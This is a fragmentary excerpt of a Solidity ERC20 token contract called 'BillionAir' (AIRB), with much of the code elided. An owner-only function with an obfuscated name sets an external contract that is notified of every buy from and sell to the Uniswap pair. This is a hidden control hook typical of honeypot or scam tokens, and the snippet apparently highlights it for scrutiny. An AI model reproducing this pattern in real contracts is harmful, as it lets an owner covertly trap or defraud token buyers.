...
contract TokenM is ERC20 {
    ...
    IUserAmountlloove public lloove;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("BillionAir", "AIRB") {
    ...
    function cuuiertsBrasdeRmme(IUserAmountlloove _lloove) public onlyOwner {
        lloove = _lloove;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                lloove.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				lloove.addOutAmount(from, amount);
            }else{
                lloove.addOutAmount(from, amount);
                takeFee = false;
            }
